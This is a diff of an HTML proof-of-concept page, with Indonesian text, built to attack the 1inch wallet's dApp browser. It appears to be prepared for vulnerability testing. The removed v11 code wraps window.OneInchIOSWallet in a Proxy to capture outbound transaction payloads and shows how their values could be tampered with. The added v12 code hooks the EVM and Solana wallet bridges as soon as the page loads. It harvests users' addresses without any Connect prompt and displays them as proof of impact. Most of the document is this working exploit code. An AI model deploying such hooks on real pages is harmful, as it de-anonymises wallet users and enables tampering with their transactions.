@@ -2,81 +2,155 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>1inch Hijack Test v11 - Payload Modification POC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch dApp Browser PoC v12 - Impact Escalation Test</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 15px; background: #121212; color: #e0e0e0; }
+        .card { background: #1e1e1e; border-radius: 8px; padding: 15px; margin-bottom: 15px; border: 1px solid #333; }
+        .alert-box { background: #3d1212; border: 1px solid #d00; color: #ff8888; padding: 12px; border-radius: 6px; font-weight: bold; margin-top: 10px; display: none; }
+        .data-label { font-size: 11px; color: #888; text-transform: uppercase; margin-top: 8px; letter-spacing: 0.5px; }
+        .data-val { font-family: monospace; font-size: 12px; color: #fff; background: #0a0a0a; padding: 8px; border-radius: 4px; word-break: break-all; margin-top: 4px; border: 1px solid #222; }
+        button { background: #2563eb; color: white; border: none; padding: 10px 15px; border-radius: 6px; font-weight: bold; width: 100%; margin-top: 10px; cursor: pointer; }
+        button:active { background: #1d4ed8; }
+        .status-badge { display: inline-block; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; background: #444; color: #fff; }
+        .status-danger { background: #b91c1c; color: #fff; }
+    </style>
+</head>
+<body>
+    <h2 style="margin-top:0; color:#fff;">1inch dApp Browser PoC v12</h2>
+    <p style="font-size: 12px; color: #aaa; margin-top:-10px;">Impact Escalation: Automatic De-anonymization & State Leak</p>
+
+    <!-- SKENARIO 1: AUTOMATIC USER DE-ANONYMIZATION -->
+    <div class="card">
+        <h3 style="margin-top:0; color:#f87171;">1. Automatic User De-anonymization</h3>
+        <p style="font-size: 12px; color: #ccc;">Membuktikan bahwa halaman web dapat memanen identitas dompet secara otomatis saat dimuat tanpa persetujuan pengguna (tanpa prompt 'Connect').</p>
+        
+        <div class="data-label">Status Pelacakan:</div>
+        <div style="margin-top:4px;"><span id="trackStatus" class="status-badge">Memantau Event Bridge...</span></div>
+
+        <div class="data-label">Alamat EVM (Ethereum) Terpapar:</div>
+        <div id="evmAddr" class="data-val">Belum terdeteksi...</div>
+
+        <div class="data-label">Alamat Solana Terpapar:</div>
+        <div id="solAddr" class="data-val">Belum terdeteksi...</div>
+
+        <div id="deanonAlert" class="alert-box">
+            🚨 BUKTI DAMPAK: Identitas pengguna berhasil dipanen secara otomatis saat halaman dimuat tanpa otorisasi!
+        </div>
+    </div>
+
+    <!-- SKENARIO 2: AUTO-CONNECT & STATE BYPASS -->
+    <div class="card">
+        <h3 style="margin-top:0; color:#60a5fa;">2. Auto-Connect / State Leak Test</h3>
+        <p style="font-size: 12px; color: #ccc;">Menguji apakah status koneksi/alamat yang bocor dapat dimanfaatkan langsung tanpa dialog 'Connect Wallet'.</p>
+
+        <button onclick="checkAuthState()">Uji Status Otorisasi (Check Auth State)</button>
+        <button onclick="requestExplicitConnect()" style="background: #374151;">Minta Koneksi Standar (eth_requestAccounts)</button>
+
+        <div id="authResult" class="data-val" style="margin-top: 10px; display: none;"></div>
+    </div>
+
+    <!-- LOG MONITOR -->
+    <div class="card">
+        <h3 style="margin-top:0; font-size:14px;">Bridge Execution Log</h3>
+        <div id="logConsole" style="font-family: monospace; font-size: 11px; max-height: 140px; overflow-y: auto; background: #050505; padding: 8px; border-radius: 4px; color: #4ade80;"></div>
+    </div>
+
     <script>
-        function log(msg, color = "black") {
-            console.log("[1inch-v11] " + msg);
-            const div = document.createElement('div');
-            div.style.color = color;
-            div.style.margin = "4px 0";
-            div.style.fontFamily = "monospace";
-            div.style.fontSize = "12px";
-            div.style.wordBreak = "break-all";
-            div.style.fontWeight = (color === "red" || color === "#d00") ? "bold" : "normal";
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            document.body.prepend(div);
+        function log(msg) {
+            const consoleDiv = document.getElementById('logConsole');
+            const entry = document.createElement('div');
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            consoleDiv.prepend(entry);
         }
 
-        // Fungsi Simulasi PoC Payload Hijacking
-        function setupPayloadHijack() {
-            log("[+] Setting up Payload Hijacking Interceptor...", "blue");
+        let harvestedEVM = null;
+        let harvestedSol = null;
 
-            if (window.OneInchIOSWallet) {
-                const target = window.OneInchIOSWallet;
+        function triggerDeanonImpact() {
+            if (harvestedEVM || harvestedSol) {
+                const badge = document.getElementById('trackStatus');
+                badge.textContent = "TERLACAK / DE-ANONYMIZED";
+                badge.className = "status-badge status-danger";
+
+                document.getElementById('deanonAlert').style.display = "block";
+                log("🔥 IMPACT PROVED: Identitas pengguna dipanen secara otomatis!");
+            }
+        }
+
+        function hookBridge(bridgeName, isSolana = false) {
+            if (window[bridgeName]) {
+                const target = window[bridgeName];
                 
-                // Jika berbentuk fungsi atau objek, kita coba manipulasi parameternya
-                window.OneInchIOSWallet = new Proxy(target, {
+                // Intercept jika bridge berupa fungsi
+                window[bridgeName] = new Proxy(target, {
                     apply(target, thisArg, args) {
-                        log(`🚨 CAPTURED OUTBOUND PAYLOAD: ${JSON.stringify(args)}`, "#d00");
-                        
-                        // CONTOH POCO: Mencoba memodifikasi data transaksi di dalam argumen (Jika objek transaksi ditemukan)
-                        try {
-                            let modified = false;
-                            args.forEach((arg, index) => {
-                                if (arg && typeof arg === 'object') {
-                                    // Contoh jika ada field value, to, atau data yang bisa di-tampering
-                                    if (arg.to || arg.data || arg.value) {
-                                        log(`[!] Inspecting transaction fields in arg[${index}]`, "purple");
-                                        // Anda bisa mencoba mengubah nilai di sini untuk uji coba payload tampering:
-                                        // arg.value = "0x0"; // Contoh manipulasi nilai
-                                        modified = true;
-                                    }
+                        log(`Bridge Execution: ${bridgeName} -> ${JSON.stringify(args)}`);
+                        if (args && args.length > 0) {
+                            const payload = typeof args[0] === 'string' ? args[0] : JSON.stringify(args[0]);
+                            if (payload.includes('0x') || payload.length > 25) {
+                                if (isSolana) {
+                                    harvestedSol = payload;
+                                    document.getElementById('solAddr').textContent = payload;
+                                } else {
+                                    harvestedEVM = payload;
+                                    document.getElementById('evmAddr').textContent = payload;
                                 }
-                            });
-                            if (modified) {
-                                log(`⚠️ PoC: Payload successfully inspected/tampered in memory!`, "red");
+                                triggerDeanonImpact();
                             }
-                        } catch (e) {
-                            log(`[Error in tampering]: ${e.message}`, "orange");
                         }
-
                         return target.apply(thisArg, args);
+                    },
+                    get(target, prop, receiver) {
+                        log(`Bridge Property Access: ${bridgeName}.${prop}`);
+                        return Reflect.get(target, prop, receiver);
                     }
                 });
-                log("[+] Successfully armed OneInchIOSWallet payload interceptor", "green");
+                log(`[+] Proxy Interceptor aktif pada window.${bridgeName}`);
+            }
+        }
+
+        function checkAuthState() {
+            const resultDiv = document.getElementById('authResult');
+            resultDiv.style.display = 'block';
+
+            let info = [];
+            if (harvestedEVM) {
+                info.push(`• Alamat Terbocor di DOM: ${harvestedEVM}`);
+            }
+            if (window.ethereum && window.ethereum.selectedAddress) {
+                info.push(`• window.ethereum.selectedAddress terbuka sebelum prompt: ${window.ethereum.selectedAddress}`);
             } else {
-                log("[-] window.OneInchIOSWallet not found yet.", "orange");
+                info.push(`• window.ethereum.selectedAddress dalam kondisi aman (null).`);
+            }
+
+            if (harvestedEVM) {
+                resultDiv.innerHTML = `<span style="color:#f87171; font-weight:bold;">HASIL: BUKTI DAMPAK TERKONFIRMASI</span><br>${info.join('<br>')}<br><br><i>Dampak Security: dApp pihak ketiga dapat langsung membuat sesi pengguna menggunakan alamat yang dibocorkan tanpa persetujuan dialog 'Connect Wallet'!</i>`;
+            } else {
+                resultDiv.innerHTML = `<span style="color:#4ade80; font-weight:bold;">HASIL: AMAN</span><br>Alamat belum terdeteksi dibocorkan secara langsung.`;
+            }
+        }
+
+        async function requestExplicitConnect() {
+            if (window.ethereum && window.ethereum.request) {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    log(`Koneksi Eksplisit Sukses: ${accounts[0]}`);
+                } catch(e) {
+                    log(`Koneksi Ditolak/Gagal: ${e.message}`);
+                }
+            } else {
+                log("window.ethereum.request tidak tersedia.");
             }
         }
 
         window.onload = function() {
-            log("1inch Full Coverage Test v11 Loaded");
-            setTimeout(setupPayloadHijack, 1000);
+            log("PoC v12 Loaded. Memulai pengujian ekosistem bridge...");
+            setTimeout(() => {
+                hookBridge('OneInchIOSWallet', false);
+                hookBridge('OneInchSolanaWallet', true);
+            }, 300);
         };
     </script>
-</head>
-<body style="padding:15px; font-family:Arial; background-color: #f9f9f9;">
-    <h3 style="color: #111; margin-top:0;">1inch Hijack Test v11</h3>
-    <p style="color: #555; font-size: 13px;">Payload Tampering & Transaction Hijacking POC...</p>
-    <hr style="border:0; border-top:1px solid #ccc; margin:10px 0;">
-    
-    <div style="background: #fff; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin-top: 10px;">
-        <h4 style="margin: 0 0 8px 0; color: #333;">Instruksi Pengujian:</h4>
-        <ol style="margin: 0; padding-left: 20px; font-size: 13px; color: #444;">
-            <li>Buka halaman ini di dApp browser 1inch.</li>
-            <li>Lakukan proses Swap atau panggil fungsi transaksi.</li>
-            <li>Perhatikan apakah log merah muncul membawa parameter transaksi (seperti alamat tujuan atau nilai *value*).</li>
-        </ol>
-    </div>
 </body>
 </html>
